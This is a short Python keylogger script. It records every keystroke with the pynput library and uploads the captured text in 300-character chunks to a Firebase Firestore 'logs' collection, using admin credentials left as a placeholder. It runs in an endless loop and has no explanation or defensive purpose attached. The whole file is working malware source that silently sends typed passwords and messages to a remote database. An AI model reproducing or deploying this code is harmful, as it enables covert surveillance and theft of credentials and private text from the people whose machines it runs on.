from pynput.keyboard import Listener
import firebase_admin
from firebase_admin import credentials
from firebase_admin import firestore

admin_creds = {
# your admin creds
}

cred = credentials.Certificate(admin_creds)
app = firebase_admin.initialize_app(cred)
db = firestore.client()
    
tempLog = ""

def uploadLog():
    global tempLog
    upload = {
        'log': tempLog 
    }
    db.collection("logs").add(upload)

def write_to_file(key):
    global tempLog
    letter = str(key)
    letter = letter.replace("'", "")

    if letter == 'Key.space':
        letter = ' '
    if letter == 'Key.shift_r':
        letter = ' r_shift '
    if letter == "Key.ctrl_l":
        letter = " l_ctrl "
    if letter == "Key.enter":
        letter = "\n"
    if letter == "Key.backspace":
        letter = "-back-"
    
    tempLog = tempLog + letter
    
    if len(tempLog) >= 300:
        uploadLog()
        tempLog = ""


while True:
    with Listener(on_press=write_to_file) as l:
       l.join()